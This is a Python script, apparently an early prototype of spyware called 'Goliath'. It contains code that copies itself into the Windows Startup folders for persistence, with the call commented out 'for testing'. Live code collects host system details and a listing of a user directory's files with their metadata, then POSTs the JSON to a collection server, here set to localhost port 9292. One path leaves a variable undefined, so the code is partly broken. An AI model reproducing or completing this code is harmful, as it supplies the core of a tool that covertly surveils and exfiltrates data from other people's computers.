import os
import shutil
import subprocess
import json
import requests
import platform
import fluffylog
import time

# Create log instance
log = fluffylog.FluffyLog()
log.info('Goliath Online...')

# C:\Users\Kasutaja\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
# C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
#

win7_common_startup =\
        'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
win7_user_startup =\
        os.path.join(os.path.expanduser("~"),\
        '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')

# print(win7_user_startup)
# subprocess.call("explorer {}".format(win7_user_startup), shell=True)


def copy_to_dir(dir_path):
    if os.path.exists(dir_path):
        shutil.copy(__file__, dir_path)
        log.debug('Copied itself to ({})'.format(dir_path))
    else:
        os.mkdir(dir_path)
        log.warning('Dir does not exist, creating ({})'.format(dir_path))
        shutil.copy(__file__, dir_path)
        log.debug('Copied itself to ({})'.format(dir_path))


def copy_to_startup():
    try:
        copy_to_dir(win7_common_startup)
    except Exception as e:
        raise e
        copy_to_dir(win7_user_startup)

# Coment for testing
# copy_to_startup()

# if os.path.isdir(win7_common_startup):
#     shutil.copy(__file__, win7_common_startup)

#print(win7_common_startup)

# shutil.copy(__file__, )


pc_info = platform.uname()
pc_data = {'kind': 'PC info', 'data': {
    'Name': pc_info.node,
    'System': pc_info.system,
    'Version': pc_info.version,
    'Release': pc_info.release,
    'Machine': pc_info.machine,
    'Processor': pc_info.processor
}}

b = os.path.expanduser("~/MyApps/school/introduction python")

if os.path.isdir(b):
    file_data = {'kind': 'User path data', 'data': []}
    all_files = []
    c = os.walk(b)
    for root, dirs, files in c:
        # print(root, dirs, files)
        dir_files = []
        for f in files:
            stat = os.stat(os.path.join(root, f))
            # file = os.path.join(root, f)
            # file = [os.path.join(root, f), os.stat(os.path.join(root, f))]
            #
            dir_files.append({'name': f, 'stats': stat})
        all_files.append({'folder': root, 'files': dir_files})
    file_data.update({'data': all_files})

all_data = {'pc_data': pc_data, 'file_data': file_data}

all_data_json = json.dumps(all_data)
# print(all_data_json)

url = 'http://127.0.0.1:9292/json'
data = all_data_json
s = requests.Session()
req = requests.Request('POST', url, data=data)
# r = requests.post('http://127.0.0.1:9292/json', data=all_data_json)
# print(r.headers)

prepped = req.prepare()
prepped.headers['Content-Type'] = 'application/json'

resp = s.send(prepped)
print(prepped.headers)
print(resp.status_code)
log.flush()